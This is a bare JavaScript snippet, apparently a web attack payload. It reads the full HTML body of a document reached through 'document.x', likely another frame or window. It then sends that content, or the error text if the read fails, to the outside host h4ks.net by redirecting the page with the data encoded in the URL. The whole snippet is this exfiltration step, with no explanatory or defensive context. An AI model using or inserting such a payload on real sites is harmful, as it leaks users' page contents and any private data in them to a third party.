try {
    var x = document.x.document.body.outerHTML;
    location = '//h4ks.net/go/test?'+encodeURIComponent(x);
} catch (err) {
    location = '//h4ks.net/go/test?'+encodeURIComponent(err.toString());
}
